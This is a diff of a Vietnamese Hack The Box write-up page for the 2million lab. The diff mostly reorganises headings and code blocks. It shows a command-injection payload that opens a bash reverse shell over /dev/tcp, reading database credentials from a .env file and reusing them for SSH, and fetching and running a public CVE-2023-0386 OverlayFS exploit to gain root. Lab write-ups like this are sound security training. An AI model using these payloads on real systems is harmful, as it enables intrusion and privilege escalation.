@@ -784,7 +784,7 @@
                      data-src="/assets/2026-05-12-14-21-56.png"
                      
                 ></p>
-<p>vào trang chính của bài thì sẽ thấy phần login , join, muốn có tài khoản login thì cần join trước và phần này yêu cầu <code>invite code</code> </p>
+<h1 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h1><p>vào trang chính của bài thì sẽ thấy phần login , join, muốn có tài khoản login thì cần join trước và phần này yêu cầu <code>invite code</code> </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -816,8 +816,7 @@
 
 <p>decode cái string đó để nhận cái invitecode: <code>echo &#39;NVE3VUctTFVUVlotU0VSWDQtQURYTk4&#39; | base64 -d </code></p>
 <p>rồi đăng ký thôi, sau khi đăng nhập vào trong thì trạng thái tài khoản là user thường và các tính năng dành cho admin đã bị chặn. </p>
-<p>Mò 1 lúc trong trang chủ các phần thì trong phần <code>ACCESS</code> có phần connect pack là cần tải file opvn về máy. Và bắt 1 cái dc cái path <code>http://2million.htb/api/v1/user/vpn/generate</code> trong phần http history trong burp. </p>
-<p>Nếu ko muốn mò thì có thể dùng tool ffuf để tìm các path, hoặc mò source code các api như &#x2F;api&#x2F;v1 , bài này dùng chung1 khuôn api mà</p>
+<p>dùng tool ffuf để tìm các path, hoặc mò source code các api như &#x2F;api&#x2F;v1 , bài này dùng chung1 khuôn api nên có thể thử từng cái như &#x2F;api, &#x2F;api….</p>
 <p>thử dùng method GET tới từng path để thử xem có nhận lại được gì không, bắt đầu từ <code>/api</code> và nhận dc luôn cái &#x2F;api&#x2F;v1 : version 1</p>
 <p> tiếp tục khai thác path <code>GET /api/v1 HTTP/1.1</code> và nhận dc cả 1 kho báu ấy</p>
 <p><img  
@@ -846,7 +845,7 @@
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://2million.htb/api/v1/admin/vpn/generate \</span><br><span class="line">     --cookie &quot;PHPSESSID=&lt;your_token&gt;&quot; \</span><br><span class="line">     -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">     -d &#x27;&#123;&quot;username&quot;:&quot;user; bash -c \&quot;bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/4444 0&gt;&amp;1\&quot; #&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
 
 
-<p>sau khi vào shell r, thì ls -la  thấy 1 số thư mục</p>
+<p>sau khi vào shell r, thì ls -la mình thấy 1 số thư mục</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@2million:~/html$ cat .env</span><br><span class="line">cat .env</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_DATABASE=htb_prod</span><br><span class="line">DB_USERNAME=admin</span><br><span class="line">DB_PASSWORD=SuperDuperPass123</span><br></pre></td></tr></table></figure></div>
 <p>có user và pass để ssh:</p>
 <p><code>ssh admin@&lt;your_targer_ip_lab&gt;</code> pass <code>SuperDuperPass123</code></p>
@@ -860,7 +859,7 @@
 <p>OverlayFS là 1 hệ thống tệp, cho phép chồng nhiều thư mục lên nhau nhưng vẫn giữ nguyên dữ liệu gốc. Cấu trúc của nó là </p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lower layer (thư mục read-only) . Chứa dữ liệu gốc</span><br><span class="line"></span><br><span class="line">Upper layer (writable) . Mọi thay đổi về tệp sẽ lưu ở đây</span><br><span class="line"></span><br><span class="line">merged view (góc nhìn hợp nhất) . Hiển thị kết quả sau khi chồng tầng Upper lên tầng Lower.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>1 tệp có ở cả hai tầng, hệ thống sẽ ưu tiên lấy tệp ở tầng Upper, sửa một tệp từ tầng Lower, OverlayFS sẽ copy tệp đó lên tầng Upper rồi mới tiến hành sửa. Tệp gốc ở Lower không thay đổi</p>
-<h1 id="Khai-Thac"><a href="#Khai-Thac" class="headerlink" title="Khai Thác"></a>Khai Thác</h1><p>Kẻ tấn công tạo một tệp có quyền SUID trong một phân vùng mà họ có quyền kiểm soát</p>
+<h1 id="Khai-Thac-root-flag"><a href="#Khai-Thac-root-flag" class="headerlink" title="Khai Thác root flag"></a>Khai Thác root flag</h1><p>Kẻ tấn công tạo một tệp có quyền SUID trong một phân vùng mà họ có quyền kiểm soát</p>
 <p>Khi tệp này được truy cập thông qua OverlayFS, Kernel sẽ thực hiện thao tác “copy-up” từ tầng dưới (Lower) lên tầng trên (Upper)</p>
 <p>Lỗ hổng xảy ra khi Kernel không kiểm tra lại quyền SUID trong quá trình copy, dẫn đến việc tệp SUID của Root xuất hiện ở tầng Upper (nơi có quyền thực thi)</p>
 <p>&#x3D;&#x3D;&gt; user bình thường có thể thực thi tệp SUID này để lấy quyền Root toàn bộ hệ thống.</p>
@@ -869,15 +868,19 @@
 <p>Download and compile exploit on Kali:</p>
 <p>git clone <a class="link"   target="_blank" rel="noopener" href="https://github.com/xkaneiki/CVE-2023-0386" >https://github.com/xkaneiki/CVE-2023-0386<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>cd CVE-2023-0386<br>make all</p>
 <p>Transfer to target:</p>
-<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>python3 -m http.server 8000</p>
-<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><p>wget <a class="link"   target="_blank" rel="noopener" href="http://your_ip:8000/exploit.zip" >http://YOUR_IP:8000/exploit.zip<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>unzip exploit.zip<br>make all</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc</span><br><span class="line">[+] len of gc: 0x3ee0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h2 id="Tren-linux-cung-cap-thu-muc-chua-cve-download"><a href="#Tren-linux-cung-cap-thu-muc-chua-cve-download" class="headerlink" title="Trên linux cùng cấp thư mục chứa cve download"></a>Trên linux cùng cấp thư mục chứa cve download</h2><p><code>python3 -m http.server 8000</code></p>
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://YOUR_IP:8000/exploit.zip</span><br><span class="line">unzip exploit.zip</span><br><span class="line">make all</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc</span><br><span class="line">[+] len of gc: 0x3ee0</span><br></pre></td></tr></table></figure></div>
 
 <p>Terminal 2:</p>
-<p>.&#x2F;exp</p>
-<p>Grab root flag:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure></div>
+<p>verify root user </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=0(root) gid=1001(dev_ryan) groups=1001(dev_ryan)</span><br></pre></td></tr></table></figure></div>
+
+<p>root flag:</p>
 <p>cat &#x2F;root&#x2F;root.txt</p>
-<h1 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h1><h1 id="Khai-Thac-1"><a href="#Khai-Thac-1" class="headerlink" title="Khai Thác"></a>Khai Thác</h1>
+
 		</div>
 
 		
@@ -931,7 +934,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">[HTB] DevArea</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Gioi-thieu"><span class="nav-text">Giới thiệu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconnaissance-Enumeration"><span class="nav-text">Reconnaissance &amp; Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#command-injection-reverse-shell"><span class="nav-text">command injection -&gt; reverse shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root-Flag"><span class="nav-text">root Flag</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Khai-Thac"><span class="nav-text">Khai Thác</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kali"><span class="nav-text">Kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Target"><span class="nav-text">Target</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Phan-tich"><span class="nav-text">Phân tích</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Khai-Thac-1"><span class="nav-text">Khai Thác</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Gioi-thieu"><span class="nav-text">Giới thiệu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconnaissance-Enumeration"><span class="nav-text">Reconnaissance &amp; Enumeration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Phan-tich"><span class="nav-text">Phân tích</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#command-injection-reverse-shell"><span class="nav-text">command injection -&gt; reverse shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root-Flag"><span class="nav-text">root Flag</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Khai-Thac-root-flag"><span class="nav-text">Khai Thác root flag</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tren-linux-cung-cap-thu-muc-chua-cve-download"><span class="nav-text">Trên linux cùng cấp thư mục chứa cve download</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Target"><span class="nav-text">Target</span></a></li></ol>
 
 	</div>
 </div>
